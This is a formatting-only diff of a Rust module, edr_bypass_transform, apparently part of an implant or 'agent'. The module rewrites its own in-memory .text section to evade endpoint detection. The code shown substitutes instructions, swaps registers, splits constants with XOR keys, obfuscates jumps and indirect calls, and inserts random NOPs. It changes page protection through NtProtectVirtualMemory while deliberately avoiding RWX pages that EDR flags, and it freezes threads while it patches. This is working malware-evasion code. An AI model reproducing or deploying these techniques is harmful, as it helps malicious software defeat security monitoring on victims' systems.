@@ -59,14 +59,17 @@
 
 // Static assertion: PAGE_READWRITE (0x04) must never be confused with
 // PAGE_EXECUTE_READWRITE (0x40).  RWX pages are the #1 EDR signal.
-const _: () = assert!(0x04u32 != 0x40u32, "PAGE_READWRITE must differ from PAGE_EXECUTE_READWRITE");
+const _: () = assert!(
+    0x04u32 != 0x40u32,
+    "PAGE_READWRITE must differ from PAGE_EXECUTE_READWRITE"
+);
 
 use anyhow::{bail, Context, Result};
 use once_cell::sync::Lazy;
 use rand::Rng;
 use sha2::{Digest, Sha256};
 use std::collections::HashSet;
-use std::sync::atomic::{AtomicU64, AtomicU32, Ordering};
+use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
 use std::sync::Mutex;
 
 // ── Public types ────────────────────────────────────────────────────────────
@@ -242,8 +245,7 @@ static TOTAL_TRANSFORMS: AtomicU64 = AtomicU64::new(0);
 static LAST_SCAN_TIMESTAMP: AtomicU64 = AtomicU64::new(0);
 
 /// Most recent cycle result (for status queries).
-static LAST_RESULT: Lazy<Mutex<Option<TransformCycleResult>>> =
-    Lazy::new(|| Mutex::new(None));
+static LAST_RESULT: Lazy<Mutex<Option<TransformCycleResult>>> = Lazy::new(|| Mutex::new(None));
 
 // ── Internal helpers ────────────────────────────────────────────────────────
 
@@ -304,9 +306,8 @@ fn extract_context(text: &[u8], offset: usize, pattern_len: usize) -> String {
 pub fn scan_for_signatures() -> Result<Vec<SignatureHit>> {
     let text_section = crate::self_reencode::find_text_section()
         .context("edr_bypass_transform: failed to locate .text section")?;
-    let text = unsafe {
-        std::slice::from_raw_parts(text_section.base as *const u8, text_section.size)
-    };
+    let text =
+        unsafe { std::slice::from_raw_parts(text_section.base as *const u8, text_section.size) };
 
     let mut hits = Vec::new();
 
@@ -362,14 +363,21 @@ fn build_exclusion_bitmap(text: &[u8]) -> Vec<bool> {
 /// Apply instruction substitution: `xor rax, rax` → `sub rax, rax`.
 ///
 /// Pattern: `48 31 C0` (xor rax, rax) → `48 29 C0` (sub rax, rax)
-fn transform_xor_to_sub(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+fn transform_xor_to_sub(
+    text: &mut [u8],
+    excluded: &[bool],
+    actionable: &HashSet<usize>,
+) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     let pattern = [0x48, 0x31, 0xC0]; // xor rax, rax
     let replacement = [0x48, 0x29, 0xC0]; // sub rax, rax
     let offsets = find_pattern_offsets(text, &pattern);
 
     for offset in offsets {
-        if excluded.get(offset..offset + 3).map_or(true, |slice| slice.iter().any(|&b| b)) {
+        if excluded
+            .get(offset..offset + 3)
+            .map_or(true, |slice| slice.iter().any(|&b| b))
+        {
             continue;
         }
         if !actionable.contains(&offset) {
@@ -398,22 +406,27 @@ fn transform_xor_to_sub(text: &mut [u8], excluded: &[bool], actionable: &HashSet
 /// For safety, this transformation is only applied when the replacement
 /// fits without overwriting non-NOP bytes.  In practice we look for the
 /// `FF 15` (call [rip+disp32]) encoding and check room.
-fn transform_indirect_call(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+fn transform_indirect_call(
+    text: &mut [u8],
+    excluded: &[bool],
+    actionable: &HashSet<usize>,
+) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     // FF 15 XX XX XX XX = call [rip+disp32]
     let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(6)], &[0xFF, 0x15]);
 
     for offset in offsets {
-        if excluded.get(offset..offset + 6).map_or(true, |z| z.iter().any(|&x| x)) {
+        if excluded
+            .get(offset..offset + 6)
+            .map_or(true, |z| z.iter().any(|&x| x))
+        {
             continue;
         }
         if !actionable.contains(&offset) {
             continue;
         }
         // Read the 32-bit displacement.
-        let disp32 = i32::from_le_bytes(
-            text[offset + 2..offset + 6].try_into().unwrap_or([0; 4]),
-        );
+        let disp32 = i32::from_le_bytes(text[offset + 2..offset + 6].try_into().unwrap_or([0; 4]));
 
         // Build replacement:
         //   4D 8D 3D XX XX XX XX  = lea r15, [rip+disp32]
@@ -459,7 +472,11 @@ fn transform_indirect_call(text: &mut [u8], excluded: &[bool], actionable: &Hash
 /// Inserts random semantic NOP instructions at safe locations (after RET
 /// instructions or before existing NOP padding).  Each insertion adds 2–5
 /// bytes of semantic-equivalent NOP.
-fn transform_nop_insertion(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+fn transform_nop_insertion(
+    text: &mut [u8],
+    excluded: &[bool],
+    actionable: &HashSet<usize>,
+) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     let mut rng = rand::thread_rng();
 
@@ -531,7 +548,11 @@ fn transform_nop_insertion(text: &mut [u8], excluded: &[bool], actionable: &Hash
 /// a function could corrupt argument passing.  `r11` is volatile and
 /// caller-saved in both System V and Windows x64 ABIs, and is not used
 /// for argument passing in either convention.
-fn transform_register_swap_rax_r11(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+fn transform_register_swap_rax_r11(
+    text: &mut [u8],
+    excluded: &[bool],
+    actionable: &HashSet<usize>,
+) -> Vec<TransformRecord> {
     let mut records = Vec::new();
 
     // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
@@ -544,7 +565,10 @@ fn transform_register_swap_rax_r11(text: &mut [u8], excluded: &[bool], actionabl
         if count >= max_swaps {
             break;
         }
-        if excluded.get(offset..offset + 10).map_or(true, |z| z.iter().any(|&x| x)) {
+        if excluded
+            .get(offset..offset + 10)
+            .map_or(true, |z| z.iter().any(|&x| x))
+        {
             continue;
         }
         if !actionable.contains(&offset) {
@@ -563,7 +587,7 @@ fn transform_register_swap_rax_r11(text: &mut [u8], excluded: &[bool], actionabl
         let before = text[offset..offset + 10].to_vec();
 
         // Replace `mov rax, imm64` (48 B8) with `mov r11, imm64` (49 BB).
-        text[offset] = 0x49;      // REX.WB prefix for r11
+        text[offset] = 0x49; // REX.WB prefix for r11
         text[offset + 1] = 0xBB; // change B8 → BB (r11)
 
         // If 2 bytes of NOP/CC padding follow, append `xchg rax, r11` so
@@ -633,7 +657,11 @@ fn transform_register_swap_rax_r11(text: &mut [u8], excluded: &[bool], actionabl
 /// which needs only 2 bytes).
 ///
 /// The XOR key is a random non-zero 32-bit value, regenerated per hit.
-fn transform_constant_splitting(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+fn transform_constant_splitting(
+    text: &mut [u8],
+    excluded: &[bool],
+    actionable: &HashSet<usize>,
+) -> Vec<TransformRecord> {
     let mut records = Vec::new();
     let mut rng = rand::thread_rng();
 
@@ -651,7 +679,10 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool], actionable: 
         if offset + 19 > text.len() {
             continue;
         }
-        if excluded.get(offset..offset + 19).map_or(true, |z| z.iter().any(|&x| x)) {
+        if excluded
+            .get(offset..offset + 19)
+            .map_or(true, |z| z.iter().any(|&x| x))
+        {
             continue;
         }
         if !actionable.contains(&offset) {
@@ -691,7 +722,7 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool], actionable: 
 
         // Instruction 1: mov r11, (lo32 ^ key) with upper 32 bits zero.
         // 49 BB EE EE EE EE 00 00 00 00  (10 bytes)
-        text[offset] = 0x49;      // REX.WB prefix for r11
+        text[offset] = 0x49; // REX.WB prefix for r11
         text[offset + 1] = 0xBB; // BB = mov r11, imm64
         text[offset + 2..offset + 6].copy_from_slice(&encoded.to_le_bytes());
         text[offset + 6..offset + 10].copy_from_slice(&[0u8; 4]); // upper 32 = 0
@@ -729,14 +760,21 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool], actionable: 
 /// This transformation changes the byte signature of direct jumps while
 /// preserving the target address.  Requires extra room (NOPs/CCs) after the
 /// original jump.
-fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+fn transform_jump_obfuscation(
+    text: &mut [u8],
+    excluded: &[bool],
+    actionable: &HashSet<usize>,
+) -> Vec<TransformRecord> {
     let mut records = Vec::new();
 
     // Short jmp: EB XX (2 bytes) — replace with computed jump if room available.
     let short_jumps = find_pattern_offsets(&text[..text.len().saturating_sub(2)], &[0xEB]);
 
     for offset in short_jumps {
-        if excluded.get(offset..offset + 2).map_or(true, |z| z.iter().any(|&x| x)) {
+        if excluded
+            .get(offset..offset + 2)
+            .map_or(true, |z| z.iter().any(|&x| x))
+        {
             continue;
         }
         if !actionable.contains(&offset) {
@@ -798,7 +836,11 @@ fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool], actionable: &H
 /// convention.  A safe implementation would require full data-flow analysis to
 /// trace r10 usage from the mov to the syscall and update every instruction in
 /// between.  For now, this transform is disabled to prevent agent instability.
-fn transform_register_reassignment(_text: &mut [u8], _excluded: &[bool], _actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+fn transform_register_reassignment(
+    _text: &mut [u8],
+    _excluded: &[bool],
+    _actionable: &HashSet<usize>,
+) -> Vec<TransformRecord> {
     Vec::new()
 }
 
@@ -890,9 +932,7 @@ fn deentropize_pass(
         .collect();
 
     if nop_sites.is_empty() {
-        log::debug!(
-            "edr_bypass_transform: no semantic NOP sites to de-entropize"
-        );
+        log::debug!("edr_bypass_transform: no semantic NOP sites to de-entropize");
         return Vec::new();
     }
 
@@ -988,13 +1028,11 @@ unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
         0x04u32 as u64, // PAGE_READWRITE — never RWX (EDR signal)
         &mut old_protect as *mut _ as u64,
     )
-    .map_err(|e| anyhow::anyhow!(
-        "edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}"
-    ))?;
+    .map_err(|e| {
+        anyhow::anyhow!("edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}")
+    })?;
     if status != 0 {
-        bail!(
-            "edr_bypass_transform: NtProtectVirtualMemory failed: 0x{status:08X}"
-        );
+        bail!("edr_bypass_transform: NtProtectVirtualMemory failed: 0x{status:08X}");
     }
     Ok(old_protect)
 }
@@ -1013,13 +1051,11 @@ unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<
         original as u64,
         &mut old_protect as *mut _ as u64,
     )
-    .map_err(|e| anyhow::anyhow!(
-        "edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}"
-    ))?;
+    .map_err(|e| {
+        anyhow::anyhow!("edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}")
+    })?;
     if status != 0 {
-        bail!(
-            "edr_bypass_transform: NtProtectVirtualMemory restore failed: 0x{status:08X}"
-        );
+        bail!("edr_bypass_transform: NtProtectVirtualMemory restore failed: 0x{status:08X}");
     }
     Ok(())
 }
@@ -1061,7 +1097,10 @@ unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<
 /// are suspended during the transformation window via
 /// `self_reencode::freeze_threads()` (NtSuspendThread / SIGSTOP).
 /// Threads are automatically resumed on success or failure (Drop guard).
-pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> Result<TransformCycleResult> {
+pub fn run_edr_bypass_transform(
+    max_transforms: u32,
+    entropy_threshold: f64,
+) -> Result<TransformCycleResult> {
     let start = std::time::Instant::now();
 
     // P1-03: Suspend all sibling threads before touching .text to avoid
@@ -1126,7 +1165,11 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     if applied < max_transforms {
         let recs = transform_xor_to_sub(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+            log::debug!(
+                "edr_bypass_transform: applied {} at offset {}",
+                r.transform_type,
+                r.offset
+            );
         }
         applied += recs.len() as u32;
         all_transforms.extend(recs);
@@ -1136,7 +1179,11 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     if applied < max_transforms {
         let recs = transform_register_reassignment(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+            log::debug!(
+                "edr_bypass_transform: applied {} at offset {}",
+                r.transform_type,
+                r.offset
+            );
         }
         applied += recs.len() as u32;
         all_transforms.extend(recs);
@@ -1146,7 +1193,11 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     if applied < max_transforms {
         let recs = transform_nop_insertion(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+            log::debug!(
+                "edr_bypass_transform: applied {} at offset {}",
+                r.transform_type,
+                r.offset
+            );
         }
         applied += recs.len() as u32;
         all_transforms.extend(recs);
@@ -1157,7 +1208,11 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     if applied < max_transforms {
         let recs = transform_constant_splitting(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+            log::debug!(
+                "edr_bypass_transform: applied {} at offset {}",
+                r.transform_type,
+                r.offset
+            );
         }
         applied += recs.len() as u32;
         all_transforms.extend(recs);
@@ -1168,7 +1223,11 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     if applied < max_transforms {
         let recs = transform_register_swap_rax_r11(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+            log::debug!(
+                "edr_bypass_transform: applied {} at offset {}",
+                r.transform_type,
+                r.offset
+            );
         }
         applied += recs.len() as u32;
         all_transforms.extend(recs);
@@ -1178,7 +1237,11 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     if applied < max_transforms {
         let recs = transform_jump_obfuscation(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+            log::debug!(
+                "edr_bypass_transform: applied {} at offset {}",
+                r.transform_type,
+                r.offset
+            );
         }
         applied += recs.len() as u32;
         all_transforms.extend(recs);
@@ -1188,7 +1251,11 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     if applied < max_transforms {
         let recs = transform_indirect_call(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
-            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
+            log::debug!(
+                "edr_bypass_transform: applied {} at offset {}",
+                r.transform_type,
+                r.offset
+            );
         }
         applied += recs.len() as u32;
         all_transforms.extend(recs);
@@ -1267,9 +1334,7 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         ) {
             Ok(status) => status,
             Err(e) => {
-                log::warn!(
-                    "edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}"
-                );
+                log::warn!("edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}");
                 0
             }
         };
